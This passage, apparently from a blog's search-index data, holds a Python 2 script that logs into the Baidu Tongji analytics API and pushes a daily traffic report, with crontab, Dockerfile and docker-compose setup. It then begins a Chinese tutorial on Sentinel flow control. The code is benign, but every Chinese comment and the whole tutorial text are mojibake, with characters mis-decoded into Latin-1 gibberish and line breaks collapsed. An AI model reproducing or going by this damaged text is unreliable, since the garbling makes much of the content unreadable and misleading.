117:(i + 1) * 117] ret += rsa.encrypt(gzdata, pubkey) return ret# è§£å‹gzipdef gzdecode(data): f = StringIO.StringIO(data) gziper = gzip.GzipFile(fileobj=f, compresslevel=9) data2 = gziper.read() gziper.close() return data2# å‹ç¼©gzipdef gzencode(data): f = StringIO.StringIO() gziper = gzip.GzipFile(fileobj=f, mode='wb', compresslevel=9, ) gziper.write(data) gziper.close() return f.getvalue()# æ—¥æœŸè§£æå™¨class DateEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, datetime.date): return obj.strftime('%Y-%m-%d') else: return json.JSONEncoder.default(self, obj)# å‘é€æ¶ˆæ¯def sendMessage(title, content): data = {'text': title, 'desp': content} response = requests.get(SC_URL, params=data) return response.contentclass BaiduTongji(object): ucid = None st = None def __init__(self, username, password, token): self.username = username self.password = password self.token = token # login # self.prelogin() ret = self.dologin() self.ucid = str(ret['ucid']) self.st = ret['st'] def prelogin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'preLogin', 'uuid': UUID, 'request': {'osVersion': 'windows', 'deviceType': 'pc', 'clientVersion': '1.0'}, } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # å‹ç¼© post_data = gzencode(json.dumps(data)) # åŠ å¯† post_data = encrypt(post_data) resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'prelogin:', ret def dologin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogin', 'uuid': UUID, 'request': {'password': self.password} } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # å‹ç¼© post_data = gzencode(json.dumps(data)) # åŠ å¯† post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) if ret['retcode'] == 0: print u'dologin:', ret['retmsg'], ' ucid:', ret['ucid'], ' st:', ret['st'] return ret def dologout(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogout', 'uuid': UUID, 'request': {'ucid': self.ucid, 'st': self.st, } } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # å‹ç¼© post_data = gzencode(json.dumps(data)) # åŠ å¯† post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'logout:', ret['retmsg'] def getsitelist(self): url = API_URL + '/getSiteList' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': None, } post_data = json.dumps(data) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']['data'][0]['list'] def getdata(self, para): url = API_URL + '/getData' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': para, } post_data = json.dumps(data, cls=DateEncoder) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']''' # åœ°åŸŸåˆ†å¸ƒæŠ¥å‘Š visit/district/a # pv_count (æµè§ˆé‡(PV)) # pv_ratio (æµè§ˆé‡å æ¯”ï¼Œ%) # visit_count (è®¿é—®æ¬¡æ•°) # visitor_count (è®¿å®¢æ•°(UV)) # new_visitor_count (æ–°è®¿å®¢æ•°) # new_visitor_ratio (æ–°è®¿å®¢æ¯”ç‡ï¼Œ%) # ip_count (IP æ•°) # bounce_ratio (è·³å‡ºç‡ï¼Œ%) # avg_visit_time (å¹³å‡è®¿é—®æ—¶é•¿ï¼Œç§’) # avg_visit_pages (å¹³å‡è®¿é—®é¡µæ•°) # trans_count (è½¬åŒ–æ¬¡æ•°) # trans_ratio (è½¬åŒ–ç‡ï¼Œ%) # ç½‘ç«™æ¦‚å†µ overview/getTimeTrendRpt # pv_count (æµè§ˆé‡(PV)) # visitor_count (è®¿å®¢æ•°(UV)) # ip_count (IP æ•°) # bounce_ratio (è·³å‡ºç‡ï¼Œ%) # avg_visit_time (å¹³å‡è®¿é—®æ—¶é•¿ï¼Œç§’) # è¶‹åŠ¿åˆ†æ trend/time/a # pv_count (æµè§ˆé‡(PV)) # pv_ratio (æµè§ˆé‡å æ¯”ï¼Œ%) # visit_count (è®¿é—®æ¬¡æ•°) # visitor_count (è®¿å®¢æ•°(UV)) # new_visitor_count (æ–°è®¿å®¢æ•°) # new_visitor_ratio (æ–°è®¿å®¢æ¯”ç‡ï¼Œ%) # ip_count (IP æ•°) # bounce_ratio (è·³å‡ºç‡ï¼Œ%) # avg_visit_time (å¹³å‡è®¿é—®æ—¶é•¿ï¼Œç§’) # avg_visit_pages (å¹³å‡è®¿é—®é¡µæ•°) # trans_count (è½¬åŒ–æ¬¡æ•°) # trans_ratio (è½¬åŒ–ç‡ï¼Œ%) # avg_trans_cost (å¹³å‡è½¬åŒ–æˆæœ¬ï¼Œå…ƒ) # income (æ”¶ç›Šï¼Œå…ƒ) # profit (åˆ©æ¶¦ï¼Œå…ƒ) # roi (æŠ•èµ„å›æŠ¥ç‡ï¼Œ%)'''''' # Http è¯·æ±‚å‚æ•° para = { 'site_id': site_id, # ç«™ç‚¹ID 'method': 'trend/time/a', # è¶‹åŠ¿åˆ†ææŠ¥å‘Š 'start_date': '20170316', # æ‰€æŸ¥è¯¢æ•°æ®çš„èµ·å§‹æ—¥æœŸ 'end_date': '20170320', # æ‰€æŸ¥è¯¢æ•°æ®çš„ç»“æŸæ—¥æœŸ 'metrics': 'pv_count,visitor_count', # æ‰€æŸ¥è¯¢æŒ‡æ ‡ä¸ºPVå’ŒUV 'max_results': '0', # è¿”å›æ‰€æœ‰æ¡æ•° 'gran': 'day', # æŒ‰å¤©ç²’åº¦ day/hour/week/month }'''# æŸ¥è¯¢ç½‘ç«™æ¦‚å†µçš„ç»Ÿè®¡æ•°æ®def queryOverviewData(): bdtj = BaiduTongji(USER_NAME, PASS_WORD, TOKEN) sites = bdtj.getsitelist() site_id = sites[0]['site_id'] today = ''.join(time.strftime(\"%Y-%m-%d\", time.localtime())) yesterday = datetime.date.today() + datetime.timedelta(-1) para = {'site_id': site_id, 'method': 'overview/getTimeTrendRpt', 'start_date': yesterday, 'end_date': today, 'metrics': 'pv_count,visitor_count,ip_count,bounce_ratio,avg_visit_time', 'max_results': '0', 'gran': 'day', } # æŸ¥è¯¢æ•°æ® data = bdtj.getdata(para) # print json.dumps(data['data'][0]['result']['items'], indent=4) # æ—¥å¿— logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', filename=LOG_FILE) # æ‰“å°æŸ¥è¯¢ç»“æœ logging.info(json.dumps(data['data'][0]['result']['items'])) # ä»Šæ—¥æ•°æ® today_data = data['data'][0]['result']['items'][1][1] today_date = json.dumps(data['data'][0]['result']['items'][0][1])[7:-2].replace('/','-') # æ˜¨æ—¥æ•°æ® yesterday_data = data['data'][0]['result']['items'][1][0] yesterday_date = json.dumps(data['data'][0]['result']['items'][0][0])[7:-2].replace('/','-') # æ•°æ®æ ¼å¼åŒ– str_format = ''.join(( '&lt;form&gt;' ' &lt;table&gt;', ' &lt;tr&gt;', ' &lt;th&gt;ç»Ÿè®¡æ—¥æœŸ&lt;/th&gt;', ' &lt;th&gt;ä»Šå¤©ï¼ˆ{today_date}ï¼‰&lt;/th&gt;', ' &lt;th&gt;æ˜¨å¤©ï¼ˆ{yesterday_date}ï¼‰&lt;/th&gt;', ' &lt;/tr&gt;\\n', ' &lt;tr&gt;', ' &lt;td&gt;æµè§ˆé‡ï¼ˆPVï¼‰&lt;/td&gt;', ' &lt;td&gt;{today_pv_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_pv_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;è®¿å®¢æ•°ï¼ˆUVï¼‰&lt;/td&gt;', ' &lt;td&gt;{today_visitor_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_visitor_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;IPæ•° &lt;/td&gt;', ' &lt;td&gt;{today_ip_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_ip_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;è·³å‡ºç‡ &lt;/td&gt;', ' &lt;td&gt;{today_bounce_ratio}% &lt;/td&gt;', ' &lt;td&gt;{yesterday_bounce_ratio}%&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;å¹³å‡è®¿é—®æ—¶é•¿&lt;/td&gt;', ' &lt;td&gt;{today_avg_visit_minute}:{today_avg_visit_second} &lt;/td&gt;', ' &lt;td&gt;{yesterday_avg_visit_minute}:{yesterday_avg_visit_second}&lt;/td&gt;', ' &lt;/tr&gt;', ' &lt;/table&gt;', '&lt;/form&gt;')) report = str_format.format( today_date=today_date, today_pv_count=today_data[0], today_visitor_count=today_data[1], today_ip_count=today_data[2], today_bounce_ratio=today_data[3], today_avg_visit_minute=today_data[4]/60, today_avg_visit_second=today_data[4] % 60, yesterday_date=yesterday_date, yesterday_pv_count=yesterday_data[0], yesterday_visitor_count=yesterday_data[1], yesterday_ip_count=yesterday_data[2], yesterday_bounce_ratio=yesterday_data[3], yesterday_avg_visit_minute=yesterday_data[4]/60, yesterday_avg_visit_second=yesterday_data[4] % 60) # å‘é€æ¶ˆæ¯ title = ''.join(('ç™¾åº¦ç»Ÿè®¡æŠ¥è¡¨ï¼ˆ', time.strftime(\"%m-%d %H:%M\", time.localtime()), 'ï¼‰')) msgResp = sendMessage(title, report) msgResult = json.loads(msgResp) if msgResult['errno'] == 0: logging.info('message send successed!') else: logging.error(''.join(('message send faild: ', msgResult)))if __name__ == '__main__': queryOverviewData() Crontab å®šæ—¶ä»»åŠ¡Linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œé…åˆ Python è„šæœ¬ + Crontab å®šæ—¶ä»»åŠ¡ï¼Œå³å¯å®šæ—¶å‘é€ç»Ÿè®¡æŠ¥è¡¨ä¿¡æ¯ã€‚ 12# æ¯å¤©æ™šä¸Š23æ—¶59åˆ†å‘é€ç»Ÿè®¡æŠ¥è¡¨ä¿¡æ¯59 23 * * * /usr/bin/python2 /usr/local/baidu-push/baidu_tongji.py è„šæœ¬è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯1234$ cat /tmp/baidu_tongji_report.log2020-01-17 22:15:10,563 - www - INFO - [[[\"2020/01/16\"], [\"2020/01/17\"]], [[218, 65, 65, 76.19, 295], [100, 63, 62, 80.88, 397]], [], []]2020-01-17 22:15:15,737 - www - INFO - message send successed! Docker ä¸€é”®éƒ¨ç½²ç»Ÿè®¡æœåŠ¡ Dockerfile çš„å†…å®¹å¦‚ä¸‹ï¼Œæ„å»ºç”Ÿæˆ Docker é•œåƒåï¼Œä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒå³å¯ã€‚ ä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒæ—¶ï¼Œéœ€è¦é€šè¿‡ -v å‚æ•°æŒ‚è½½å¯¹åº”çš„æ–‡ä»¶ï¼ˆå¦‚ä¸‹ï¼‰ a) å°†å®¿ä¸»æœºé‡Œçš„ RSA å…¬é’¥æ–‡ä»¶æŒ‚è½½åˆ° Docker å®¹å™¨å†…çš„ /usr/local/python_scripts/api_pub.key ä½ç½® b) å°†å®¿ä¸»æœºé‡Œçš„ Python è„šæœ¬æ–‡ä»¶æŒ‚è½½åˆ° Docker å®¹å™¨å†…çš„ /usr/local/python_scripts/baidu_tongji.py ä½ç½® 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo \"Asia/Shanghai\" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i \"s/#cron./cron./g\" /etc/rsyslog.confRUN echo \"59 23 * * * root /usr/bin/python2 /usr/local/python_scripts/baidu_tongji.py\" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log è‹¥é€šè¿‡ Docker-Compose æ¥ç®¡ç† Docker é•œåƒï¼Œé‚£ä¹ˆ YML é…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213version: '3.5'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: 'Asia/Shanghai' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/api_pub.key:/usr/local/python_scripts/api_pub.key - /usr/local/baidu-push/baidu_tongji.py:/usr/local/python_scripts/baidu_tongji.py æ•°æ®å·æŒ‚è½½ï¼š /usr/local/baidu-push/logsï¼šå®¿ä¸»æœºé‡Œçš„æ—¥å¿—ç›®å½• /usr/local/baidu-push/api_pub.keyï¼šå®¿ä¸»æœºé‡Œ RSA å…¬é’¥æ–‡ä»¶çš„è·¯å¾„ /usr/local/baidu-push/baidu_tongji.pyï¼šå®¿ä¸»æœºé‡Œ Python è„šæœ¬æ–‡ä»¶çš„è·¯å¾„ ç§»åŠ¨ç«¯çš„å±•ç¤ºæ•ˆæœ å‚è€ƒèµ„æ–™ yelord/baidutongji zephery/baidutongji var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"å…¨æ ˆæŠ€æœ¯é©¿ç«™\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"type\": \"hexo\", \"random\": \"0.9\", \"interval\": \"30\", \"expires\": \"365\", \"height\": \"auto\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"python"},{title:"Sentinel å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/8facd1ee.html",text:'å‰è¨€æœ¬æ–‡é’ˆå¯¹ Sentinel 1.8.0 åŠä»¥ä¸Šç‰ˆæœ¬ç¼–å†™ï¼Œç‰¹åˆ«è¯´æ˜é™¤å¤–ã€‚ç”±äº 1.8.0 ç‰ˆæœ¬å¯¹ç†”æ–­é™çº§ç‰¹æ€§è¿›è¡Œäº†å…¨æ–°çš„æ”¹è¿›å‡çº§ï¼Œå»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ä»¥æ›´å¥½åœ°åˆ©ç”¨ç†”æ–­é™çº§çš„èƒ½åŠ›ã€‚ æµé‡æ§åˆ¶ä¸ç†”æ–­é™çº§æµé‡æ§åˆ¶æ¦‚è¿°æ‹¿æ—…æ¸¸æ™¯ç‚¹ä¸¾ä¸ªç¤ºä¾‹ï¼Œæ—…æ¸¸æ™¯ç‚¹é€šå¸¸éƒ½ä¼šæœ‰æœ€å¤§çš„æ¥å¾…é‡ï¼Œä¸å¯èƒ½æ— é™åˆ¶çš„æ”¾æ¸¸å®¢è¿›å…¥ï¼Œæ¯”å¦‚æ•…å®«æ¯å¤©åªå–å…«ä¸‡å¼ ç¥¨ï¼Œè¶…è¿‡å…«ä¸‡çš„æ¸¸å®¢ï¼Œæ— æ³•ä¹°ç¥¨è¿›å…¥ï¼Œå› ä¸ºå¦‚æœè¶…è¿‡å…«ä¸‡äººï¼Œæ™¯ç‚¹çš„å·¥ä½œäººå‘˜å¯èƒ½å°±å¿™ä¸è¿‡æ¥ï¼Œè¿‡äºæ‹¥æŒ¤çš„æ™¯ç‚¹ä¹Ÿä¼šå½±å“æ¸¸å®¢çš„ä½“éªŒå’Œå¿ƒæƒ…ï¼Œå¹¶ä¸”è¿˜ä¼šæœ‰å®‰å…¨éšæ‚£ï¼›åªå– N å¼ ç¥¨ï¼Œè¿™å°±æ˜¯ä¸€ç§é™æµçš„æ‰‹æ®µã€‚æµé‡æ§åˆ¶åœ¨ç½‘ç»œä¼ è¾“ä¸­æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ¦‚å¿µï¼Œå®ƒç”¨äºè°ƒæ•´ç½‘ç»œåŒ…çš„å‘é€æ•°æ®ã€‚åœ¨ç½‘ç»œä¼ è¾“æ—¶ï¼Œä»»æ„æ—¶é—´åˆ°æ¥çš„è¯·æ±‚å¾€å¾€æ˜¯éšæœºä¸å¯æ§çš„ï¼Œè€Œç³»ç»Ÿçš„å¤„ç†èƒ½åŠ›æ˜¯æœ‰é™çš„ï¼Œå› æ­¤éœ€è¦æ ¹æ®ç³»ç»Ÿçš„å¤„ç†èƒ½åŠ›å¯¹æµé‡è¿›è¡Œæ§åˆ¶ã€‚ ç†”æ–­é™çº§æ¦‚è¿°åœ¨è°ƒç”¨ç³»ç»Ÿçš„æ—¶å€™ï¼Œå¦‚æœè°ƒç”¨é“¾è·¯ä¸­çš„æŸä¸ªèµ„æºå‡ºç°äº†ä¸ç¨³å®šæˆ–è€…ä¸å¯ç”¨ï¼Œæœ€ç»ˆä¼šå¯¼è‡´è¯·æ±‚å‘ç”Ÿç§¯å‹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè€Œç†”æ–­é™çº§å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æ‰€è°“çš„ç†”æ–­é™çº§å°±æ˜¯å½“æ£€æµ‹åˆ°è°ƒç”¨é“¾è·¯ä¸­æŸä¸ªèµ„æºå‡ºç°ä¸ç¨³å®šçš„è¡¨ç°ï¼Œä¾‹å¦‚è¯·æ±‚å“åº”æ—¶é—´è¿‡é•¿æˆ–è€…å¼‚å¸¸æ¯”ä¾‹å‡é«˜çš„æ—¶å€™ï¼Œåˆ™å¯¹è¿™ä¸ªèµ„æºçš„è°ƒç”¨è¿›è¡Œé™åˆ¶ï¼Œè®©è¯·æ±‚å¿«é€Ÿå¤±è´¥ï¼Œé¿å…å½±å“åˆ°å…¶ä»–çš„èµ„æºè€Œå¯¼è‡´çº§è”æ•…éšœï¼ˆæœåŠ¡é›ªå´©ï¼‰ã€‚ æµé‡æ§åˆ¶ä¸ç†”æ–­é™çº§å®ç°æ–¹æ¡ˆHystrix Hystrix æ˜¯ç”± Netflix å¼€æºçš„ä¸€ä¸ªé’ˆå¯¹åˆ†å¸ƒå¼ç³»ç»Ÿå®¹é”™å¤„ç†çš„å¼€æºç»„ä»¶ï¼Œ2011 - 2012 å¹´ç›¸ç»§è¯ç”Ÿå’Œæˆç†Ÿï¼Œåœ¨ 2018 å¹´ 11 æœˆ 20 æ—¥ä¹‹åå·²ç»åœæ­¢ç»´æŠ¤ï¼Œæœ€åä¸€ä¸ªæ­£å¼ç‰ˆæœ¬ä¸º 1.5.18ã€‚Hystrix å•è¯æ„ä¸º â€œè±ªçŒªâ€ï¼Œæµ‘èº«æœ‰åˆºä¿æŠ¤è‡ªå·±ï¼ŒHystrix å°±æ˜¯è¿™æ ·ä¸€ä¸ªç”¨æ¥æå«åº”ç”¨ç¨‹åºå¥åº·çš„åˆ©å™¨ã€‚è¿›ä¸€æ­¥è¯´ï¼ŒHystrix æ˜¯ä¸€ä¸ªå»¶è¿Ÿå’Œå®¹é”™åº“ï¼Œç”¨åœ¨éš”ç¦»è¿œç¨‹ç³»ç»Ÿã€æœåŠ¡å’Œç¬¬ä¸‰æ–¹åº“ï¼Œé˜»æ­¢çº§è¿æ•…éšœï¼Œåœ¨å¤æ‚çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°æ¢å¤èƒ½åŠ›ï¼Œä»¥æé«˜åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¼¹æ€§ã€‚ Sentinel Sentinel æ˜¯é˜¿é‡Œå·´å·´å‡ºå“çš„é¢å‘åˆ†å¸ƒå¼æœåŠ¡æ¶æ„çš„è½»é‡çº§æµé‡æ§åˆ¶ç»„ä»¶ï¼Œä¸»è¦ä»¥æµé‡ä¸ºå…¥ç‚¹ï¼Œä»é™æµã€æµé‡æ•´å½¢ã€ç†”æ–­é™çº§ã€ç³»ç»Ÿè´Ÿè½½ä¿æŠ¤ç­‰å¤šä¸ªç»´åº¦æ¥ä¿éšœå¾®æœåŠ¡çš„ç¨³å®šæ€§ã€‚ Resilience4j Resilience4j æ˜¯ä¸€æ¬¾è½»é‡çº§ï¼Œæ˜“äºä½¿ç”¨çš„å®¹é”™åº“ï¼Œå…¶çµæ„Ÿæ¥è‡ªäº Netflix Hystrixï¼Œä½†æ˜¯ä¸“ä¸º Java 8 å’Œå‡½æ•°å¼ç¼–ç¨‹è€Œè®¾è®¡ã€‚è½»é‡çº§ï¼Œå› ä¸ºåº“åªä½¿ç”¨äº† Vavrï¼Œå®ƒæ²¡æœ‰ä»»ä½•å…¶ä»–å¤–éƒ¨ä¾èµ–ä¸‹ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒNetflix Hystrix å¯¹ Archaius å…·æœ‰ç¼–è¯‘ä¾èµ–æ€§ï¼ŒArchaius å…·æœ‰æ›´å¤šçš„å¤–éƒ¨åº“ä¾èµ–æ€§ï¼Œä¾‹å¦‚ Guava å’Œ Apache Commons Configurationã€‚åœ¨ Spring Cloud Greenwich ç‰ˆä¸­ï¼ŒSpring å®˜æ–¹æ¨èä½¿ç”¨ Resilience4j æ›¿ä»£ Hystrixã€‚ å¼€æºå®ç°æ–¹æ¡ˆå¯¹æ¯”é™„ï¼šSentinel å¯¹æ¯” Hystrix è¯¦è§£ Sentinel ä»‹ç»Sentinel ç®€ä»‹Sentinel æ˜¯é˜¿é‡Œå·´å·´å‡ºå“çš„é¢å‘åˆ†å¸ƒå¼æœåŠ¡æ¶æ„çš„è½»é‡çº§æµé‡æ§åˆ¶ç»„ä»¶ï¼Œä¸»è¦ä»¥æµé‡ä¸ºå…¥ç‚¹ï¼Œä»é™æµã€æµé‡æ•´å½¢ã€ç†”æ–­é™çº§ã€ç³»ç»Ÿè´Ÿè½½ä¿æŠ¤ç­‰å¤šä¸ªç»´åº¦æ¥ä¿éšœå¾®æœåŠ¡çš„ç¨³å®šæ€§ï¼Œæ›´å¤šä»‹ç»å¯å‚è€ƒï¼šSentinel é¡¹ç›®ã€Sentinel å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Sentinel å†å²2012 å¹´ï¼ŒSentinel è¯ç”Ÿï¼Œä¸»è¦åŠŸèƒ½ä¸ºå…¥å£æµé‡æ§åˆ¶2013 - 2017 å¹´ï¼ŒSentinel åœ¨é˜¿é‡Œå·´å·´é›†å›¢å†…éƒ¨è¿…é€Ÿå‘å±•ï¼Œæˆä¸ºåŸºç¡€æŠ€æœ¯æ¨¡å—ï¼Œè¦†ç›–äº†æ‰€æœ‰çš„æ ¸å¿ƒåœºæ™¯ï¼ŒSentinel ä¹Ÿå› æ­¤ç§¯ç´¯äº†å¤§é‡çš„æµé‡å½’æ•´åœºæ™¯ä»¥åŠç”Ÿäº§å®è·µ2018 å¹´ï¼ŒSentinel å¼€æºï¼Œå¹¶æŒç»­æ¼”è¿›2019 å¹´ Sentinel æœç€å¤šè¯­è¨€æ‰©å±•çš„æ–¹å‘ä¸æ–­æ¢ç´¢ï¼Œæ¨å‡º C++ åŸç”Ÿç‰ˆæœ¬ï¼ŒåŒæ—¶é’ˆå¯¹ Service Mesh åœºæ™¯ä¹Ÿæ¨å‡ºäº† Envoy é›†ç¾¤æµé‡æ§åˆ¶æ”¯æŒï¼Œä»¥è§£å†³ Service Mesh æ¶æ„ä¸‹å¤šè¯­è¨€é™æµçš„é—®é¢˜2020 å¹´ï¼Œæ¨å‡º Sentinel çš„ Go åŸç”Ÿç‰ˆæœ¬ï¼Œç»§ç»­æœç€äº‘åŸç”Ÿçš„æ–¹å‘æ¼”è¿›ï¼ŒåŒæ—¶å·²è¦†ç›–å¾®æœåŠ¡ã€API Gateway å’Œ Service Mesh ä¸‰å¤§æ¿å—çš„æ ¸å¿ƒç”Ÿæ€ Sentinel ç»„æˆ æ ¸å¿ƒåº“ï¼šä¸»è¦æŒ‡ Java å®¢æˆ·ç«¯ï¼Œä¸ä¾èµ–ä»»ä½•æ¡†æ¶ / åº“ï¼Œèƒ½å¤Ÿè¿è¡Œäº Java 7 åŠä»¥ä¸Šçš„ç‰ˆæœ¬çš„è¿è¡Œç¯å¢ƒï¼ŒåŒæ—¶å¯¹ Dubboã€Spring Cloudã€Spring Cloud Alibaba ç­‰æ¡†æ¶ä¹Ÿæœ‰è¾ƒå¥½çš„æ”¯æŒ æ§åˆ¶å°ï¼šæ§åˆ¶å°ä¸»è¦è´Ÿè´£ç®¡ç†æ¨é€è§„åˆ™ã€ç›‘æ§ã€é›†ç¾¤é™æµåˆ†é…ç®¡ç†ã€æœºå™¨å‘ç°ç­‰ Sentinel ä¼˜åŠ¿ å‹å¥½çš„æ§åˆ¶é¢æ¿ï¼Œæ”¯æŒå®æ—¶ç›‘æ§ å¤šç§é™æµã€‚æ”¯æŒ QPS é™æµï¼Œçº¿ç¨‹æ•°é™æµï¼Œå¤šç§é™æµç­–ç•¥ï¼Œå¦‚ï¼šç›´æ¥æ‹’ç»ï¼Œå†·å¯åŠ¨ï¼ŒåŒ€é€Ÿæ¨¡å¼ï¼ˆæ¼æ–—ï¼‰ å¤šç§é™çº§æ¨¡å¼ï¼Œæ”¯æŒæŒ‰å¹³å‡è¿”å›æ—¶é—´é™çº§ï¼ŒæŒ‰å¤šç§å¼‚å¸¸æ•°é™çº§ï¼ŒæŒ‰å¼‚å¸¸æ¯”ç‡é™çº§ æ–¹ä¾¿æ‰©å±•å¼€å‘ï¼Œæ”¯æŒ SPI æ¨¡å¼å¯¹ chain è¿›è¡Œæ‰©å±• æ”¯æŒé“¾è·¯çš„å…³è”ï¼ŒæŒ‰é“¾è·¯ç»Ÿè®¡é™æµï¼Œç³»ç»Ÿä¿æŠ¤ï¼Œçƒ­é—¨èµ„æºä¿æŠ¤ç­‰ç­‰ Sentinel ç‰¹ç‚¹ ä¸°å¯Œçš„åº”ç”¨åœºæ™¯ï¼šSentinel æ‰¿æ¥äº†é˜¿é‡Œå·´å·´è¿‘ 10 å¹´çš„åŒåä¸€å¤§ä¿ƒæµé‡çš„æ ¸å¿ƒåœºæ™¯ï¼Œä¾‹å¦‚ç§’æ€ï¼ˆå³çªå‘æµé‡æ§åˆ¶åœ¨ç³»ç»Ÿå®¹é‡å¯ä»¥æ‰¿å—çš„èŒƒå›´ï¼‰ã€æ¶ˆæ¯å‰Šå³°å¡«è°·ã€é›†ç¾¤æµé‡æ§åˆ¶ã€å®æ—¶ç†”æ–­ä¸‹æ¸¸ä¸å¯ç”¨åº”ç”¨ç­‰ å¹¿æ³›çš„å¼€æºç”Ÿæ€ï¼šSentinel æä¾›å¼€ç®±å³ç”¨çš„ä¸å…¶å®ƒå¼€æºæ¡†æ¶ / åº“çš„æ•´åˆæ¨¡å—ï¼Œä¾‹å¦‚ä¸ Spring Cloudã€Dubboã€gRPC çš„æ•´åˆï¼Œåªéœ€è¦å¼•å…¥ç›¸åº”çš„ä¾èµ–å¹¶è¿›è¡Œç®€å•çš„é…ç½®å³å¯å¿«é€Ÿåœ°æ¥å…¥ Sentinel å®Œå¤‡çš„å®æ—¶ç›‘æ§ï¼šSentinel åŒæ—¶æä¾›å®æ—¶çš„ç›‘æ§åŠŸèƒ½ã€‚å¼€å‘è€…å¯ä»¥åœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°æ¥å…¥åº”ç”¨çš„å•å°æœºå™¨ç§’çº§æ•°æ®ï¼Œç”šè‡³ 500 å°ä»¥ä¸‹è§„æ¨¡çš„é›†ç¾¤çš„æ±‡æ€»è¿è¡Œæƒ…å†µ å®Œå–„çš„ SPI 